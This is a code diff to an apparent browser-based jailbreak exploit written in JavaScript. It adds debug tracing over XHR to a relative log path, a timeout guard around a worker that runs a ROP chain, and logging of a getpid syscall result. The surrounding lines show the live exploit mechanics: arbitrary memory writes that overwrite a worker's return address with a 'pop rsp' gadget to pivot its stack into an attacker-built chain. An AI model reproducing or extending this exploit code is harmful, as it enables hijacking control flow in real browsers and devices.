@@ -135,6 +135,10 @@ const IPPROTO_UDP = 17;
 const IPPROTO_IPV6 = 41;
 const IPV6_PKTINFO = 46;
 
+var __TRACE=(function(){try{return /(^|[?&])log=debug(&|$)/.test(location.search);}catch(e){return false;}})();
+function __rop(t){if(!__TRACE)return;try{var x=new XMLHttpRequest();
+    x.open("GET","log/ROP-"+encodeURIComponent(String(t)).slice(0,180),false);x.send();}catch(e){}}
+
 function jbmark(tag, detail) {
     try {
         if (window.jb && typeof window.jb.mark === "function")
@@ -359,13 +363,25 @@ async function prepare(p) {
 
         p.write8(return_address_ptr, gadgets["pop rsp"]);
         p.write8(stack_pointer_ptr, chain.stack_entry_point);
+        // read the two slots back: proves the arbitrary write reached the worker stack
+
 
         if (window.jb && window.jb.hot)
             jbmark("CHAIN-PRE-POST", "next=worker.postMessage(0)-rop-executes-now");
         let p1 = await new Promise((resolve) => {
+            let settled = false;
             worker.onmessage = function (e) {
+                if (settled) return;
+                settled = true;
                 resolve(1);
             }
+            // a hang and a fault look identical without this
+            setTimeout(function () {
+                if (settled) return;
+                settled = true;
+                __rop("ROP-TIMEOUT-worker-never-answered-8s");
+                resolve(-1);
+            }, 8000);
             worker.postMessage(0);
         });
         if (window.jb && window.jb.hot)
@@ -409,6 +425,7 @@ async function prepare(p) {
         + "-poisoned-next=chain.syscall(SYS_GETPID)");
 
     let pid = await chain.syscall(SYS_GETPID);
+    __rop("getpid raw=0x" + pid.toString());
 
     jbmark("PREP-GETPID-POST", "raw=0x" + pid.toString());
     if (pid.low == JB_POISON.low && pid.hi == JB_POISON.hi) {
